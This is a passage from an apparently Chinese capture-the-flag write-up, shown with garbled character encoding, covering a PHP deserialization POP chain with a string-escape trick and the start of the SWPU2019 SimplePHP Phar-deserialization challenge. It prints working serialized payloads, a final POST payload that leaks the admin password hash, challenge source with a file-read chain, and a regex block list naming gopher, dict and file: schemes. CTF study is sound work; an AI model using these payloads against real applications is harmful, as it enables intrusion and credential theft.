class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> $age = <span class="literal">null</span>;</span><br><span class="line">   <span class="keyword">public</span> $nickname = <span class="literal">null</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;age = <span class="string">&#x27;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&#x27;</span>;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;nickname = <span class="keyword">new</span> Info();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> $CtrlCase;</span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;CtrlCase = <span class="keyword">new</span> dbCtrl();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UpdateHelper</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> $sql;</span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;sql = <span class="keyword">new</span> User();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> $name = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">   <span class="keyword">public</span> $password = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$o = <span class="keyword">new</span> UpdateHelper;</span><br><span class="line"><span class="keyword">echo</span> serialize($o);</span><br></pre></td></tr></table></figure><p>åºåˆ—åŒ–çš„ç»“æœ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>æ„é€ å¥½äº†POPé“¾ï¼Œæ¥ä¸‹æ¥å°±æ˜¯è¦æ‰¾åˆ°è§¦å‘ååºåˆ—åŒ–çš„ç‚¹ã€‚</p><p>ä»update.php å¯ä»¥è·Ÿè¿›Userç±»çš„update()å‡½æ•°ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $Info=unserialize(<span class="keyword">$this</span>-&gt;getNewinfo());</span><br><span class="line">    $age=$Info-&gt;age;</span><br><span class="line">    $nickname=$Info-&gt;nickname;</span><br><span class="line">    $updateAction=<span class="keyword">new</span> UpdateHelper($_SESSION[<span class="string">&#x27;id&#x27;</span>],$Info,<span class="string">&quot;update user SET age=<span class="subst">$age</span>,nickname=<span class="subst">$nickname</span> where id=&quot;</span>.$_SESSION[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">    <span class="comment">//è¿™ä¸ªåŠŸèƒ½è¿˜æ²¡æœ‰å†™å®Œ å…ˆå å‘</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»§ç»­è·Ÿè¿›<code>getNewInfo()</code>å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $age=$_POST[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line">    $nickname=$_POST[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">    <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info($age,$nickname)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°çš„è¿”å›å€¼æ˜¯ä¸€ä¸ªå…ˆåºåˆ—åŒ–åœ¨ç»è¿‡safe()å‡½æ•°å¤„ç†çš„Infoç±»å¯¹è±¡ã€‚</p><p>æ‰€ä»¥æœ€ç»ˆèƒ½å¤Ÿååºåˆ—åŒ–çš„ä¸æ˜¯æˆ‘ä»¬ç›´æ¥ä¼ å…¥çš„å­—ç¬¦ä¸²ï¼Œè€Œæ˜¯ç”¨æˆ‘ä»¬çš„å€¼å®ä¾‹åŒ–ä¸€ä¸ªInfoç±»çš„å¯¹è±¡ï¼Œç„¶åå¯¹è¿™ä¸ªå¯¹è±¡è¿›è¡Œå®ä¾‹åŒ–ï¼Œå†å¯¹è¿™ä¸ªåºåˆ—åŒ–ç»“æœè¿›è¡Œsafe()å¤„ç†ï¼Œæœ€åå¾—åˆ°çš„å€¼å†è¿›è¡Œååºåˆ—åŒ–ã€‚</p><p>æ‰€ä»¥æƒ³è¦å‘åºåˆ—åŒ–æˆ‘ä»¬çš„payloadï¼Œå°±å¾—æ§åˆ¶ Infoç±»å¯¹è±¡çš„åºåˆ—åŒ–ä¸²ï¼Œçœ‹ä¸€ä¸‹è¿™ä¸ªåºåˆ—åŒ–ä¸²çš„æ ¼å¼</p><p>ï¼ˆå‡è®¾age=20ï¼›nickname=letheï¼‰ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:2:&quot;20&quot;;s:8:&quot;nickname&quot;;s:5:&quot;lethe&quot;;s:8:&quot;CtrlCase&quot;;N;&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„åŸç†æœ‰ç‚¹ç±»ä¼¼æ³¨å…¥ï¼Œéƒ½æ˜¯é—­åˆï¼Œå…ˆçœ‹ä¸€ä¸‹æˆ‘ä»¬æ„é€ çš„payloadå¦‚ä¸‹ï¼Œæœªé€ƒé€¸å­—ç¬¦ä¸²å‰:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬åœ¨å·²åºåˆ—åŒ–ä¸²å‰é¢åŠ ä¸Šäº†<code>&quot;;s:8:&quot;CtrlCase&quot;;</code>ï¼Œåœ¨æœ€ååŠ ä¸Šäº†ä¸€ä¸ª<code>&#125;</code>ï¼ˆæ•´ä¸ªé•¿åº¦ä¸º263ï¼‰ï¼Œè¿™æ ·æˆ‘ä»¬å°†å…¶ä½œä¸º<code>new Info($age,$nickname)</code>çš„nicknameä¼ å…¥æ—¶ï¼Œåºåˆ—åŒ–çš„ç»“æœå¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:2:&quot;20&quot;;s:8:&quot;nickname&quot;;s:263:&quot;&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;&#125;&quot;;s:8:&quot;CtrlCase&quot;;N;&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯é•¿åº¦ä¸º263çš„payloadè¿˜æ˜¯å½“ä½œäº†ä¸€ä¸ªæ™®é€šå­—ç¬¦ä¸²ï¼Œè€Œä¸æ˜¯åºåˆ—åŒ–é‡Œçš„å†…å®¹ã€‚</p><p>è¿™æ—¶å€™å°±éœ€è¦ç”¨åˆ°å­—ç¬¦é€ƒé€¸çš„åŸç†äº†ï¼Œæˆ‘ä»¬åœ¨payloadçš„å‰é¢åŠ ä¸Š263ä¸ª<code>union</code>ï¼Œåœ¨ç»è¿‡safeå‡½æ•°ä¹‹åï¼Œ<code>union</code>å…¨éƒ¨è¢«æ›¿æ¢æˆ<code>hacker</code>ï¼Œä¹Ÿå°±æ˜¯ç›¸å½“äºæ–°å¢äº†263ä¸ªå­—ç¬¦ï¼Œè¿™æ ·å°±å¯¼è‡´è·Ÿåœ¨åé¢çš„é•¿åº¦ä¸º263ä¸ªå­—ç¬¦çš„payloadæˆåŠŸé€ƒé€¸ã€‚</p><p>è€Œä¹‹æ‰€å‰é¢æ„é€ çš„æ—¶å€™åœ¨æœ€åé¢åŠ ä¸€ä¸ª<code>&#125;</code>ï¼Œæ˜¯å› ä¸ºInfoç±»çš„å¯¹è±¡åªæœ‰3ä¸ªå˜é‡ï¼Œ<code>&#125;</code>å‰é¢å·²ç»æœ‰3ä¸ªå˜é‡æ»¡è¶³äº†åºåˆ—åŒ–ä¸²çš„è¦æ±‚äº†ï¼Œæ‰€ä»¥åŠ ä¸€ä¸ª<code>&#125;</code>æ¥é—­åˆæ•´ä¸ªåºåˆ—åŒ–ä¸²ã€‚</p><p>æœ€ç»ˆpayloadå¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">age&#x3D;1&amp;nickname&#x3D;unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>åœ¨update.phpå†…postæäº¤<code>age=123&amp;nickname=</code>åé¢æ¥ä¸Šè¾“å‡ºç»“æœï¼Œå°±ä¼šå¾—åˆ°adminå¯†ç çš„md5ã€‚</p><h2 id="SWPU2019-SimplePHP">SWPU2019 SimplePHP</h2><h3 id="è€ƒç‚¹-v12">è€ƒç‚¹</h3><ul><li>æ–‡ä»¶åŒ…å«</li><li>Pharååºåˆ—åŒ–</li></ul><h3 id="è§£é¢˜-v12">è§£é¢˜</h3><p>æŸ¥çœ‹æ–‡ä»¶é¡µé¢æœ‰æ–‡ä»¶åŒ…å«ï¼Œå¯ä»¥è¯»å–æºç ï¼š</p><p>file.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);  </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;function.php&#x27;</span>; </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>; </span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/var/www/html/&#x27;</span>); </span><br><span class="line">$file = $_GET[<span class="string">&quot;file&quot;</span>] ? $_GET[<span class="string">&#x27;file&#x27;</span>] : <span class="string">&quot;&quot;</span>; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($file)) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line">$show = <span class="keyword">new</span> Show(); </span><br><span class="line"><span class="keyword">if</span>(file_exists($file)) &#123; </span><br><span class="line">    $show-&gt;source = $file; </span><br><span class="line">    $show-&gt;_show(); </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>($file))&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;file doesn\&#x27;t exists.&#x27;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>function.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//show_source(__FILE__); </span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;base.php&quot;</span>; </span><br><span class="line">header(<span class="string">&quot;Content-type: text/html;charset=utf-8&quot;</span>); </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_do</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> $_FILES; </span><br><span class="line">    $filename = md5($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>].$_SERVER[<span class="string">&quot;REMOTE_ADDR&quot;</span>]).<span class="string">&quot;.jpg&quot;</span>; </span><br><span class="line">    <span class="comment">//mkdir(&quot;upload&quot;,0777); </span></span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="string">&quot;upload/&quot;</span> . $filename)) &#123; </span><br><span class="line">        unlink($filename); </span><br><span class="line">    &#125; </span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;upload/&quot;</span> . $filename); </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;ä¸Šä¼ æˆåŠŸ!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> $_FILES; </span><br><span class="line">    <span class="keyword">if</span>(upload_file_check()) &#123; </span><br><span class="line">        upload_file_do(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_check</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> $_FILES; </span><br><span class="line">    $allowed_types = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;jpeg&quot;</span>,<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;png&quot;</span>); </span><br><span class="line">    $temp = explode(<span class="string">&quot;.&quot;</span>,$_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]); </span><br><span class="line">    $extension = end($temp); </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($extension)) &#123; </span><br><span class="line">        <span class="comment">//echo &quot;&lt;h4&gt;è¯·é€‰æ‹©ä¸Šä¼ çš„æ–‡ä»¶:&quot; . &quot;&lt;h4/&gt;&quot;; </span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(in_array($extension,$allowed_types)) &#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = $name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;   <span class="comment">//$this-&gt;source = phar://phar.jpg</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;</span><br><span class="line">        <span class="keyword">return</span> $content;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params">$key,$value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;$key = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker~&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$key</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get($key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">$key</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;params[$key])) &#123;</span><br><span class="line">            $value = <span class="keyword">$this</span>-&gt;params[$key];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $value = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;file_get($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params">$value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        <span class="keyword">return</span> $text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>class.phpä¸­æœ‰ä¸€ä¸ªå¾ˆæ˜æ˜¾çš„POPé“¾ï¼Œæ­¤å¤–ï¼Œç”±äºæ²¡æœ‰unserializeå‡½æ•°è§¦å‘ååºåˆ—åŒ–ï¼Œé‚£ä¹ˆå°±åªèƒ½ä¸Šä¼ ä¸€ä¸ªpharæ¥è§¦å‘ååºåˆ—åŒ–ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span 